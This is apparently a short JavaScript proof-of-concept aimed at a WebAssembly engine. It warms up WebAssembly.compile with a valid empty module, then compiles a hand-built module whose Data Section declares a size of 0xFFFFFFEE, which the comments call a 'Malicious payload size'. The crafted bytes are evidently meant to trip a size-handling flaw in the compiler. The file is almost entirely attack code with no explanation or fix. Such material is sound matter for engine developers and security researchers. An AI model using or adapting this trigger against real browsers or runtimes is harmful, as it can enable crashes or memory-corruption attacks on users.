function poc(bytes) {
  try {
    WebAssembly.compile(bytes);
  } catch (e) {}
}

const warmup_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]);

for (let i = 0; i < 100; i++) {
  poc(warmup_bytes);
}

const malicious_bytes = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, // Wasm Header
  5, 3, 1, 0, 1,               // Memory Section. Offset is now 13 (0x0D)
  11,                          // Data Section ID
  238, 254, 255, 255, 15,      // Malicious payload size: 0xFFFFFFEE.

  1,                           // Actual payload: 1 data segment.

]);

poc(malicious_bytes);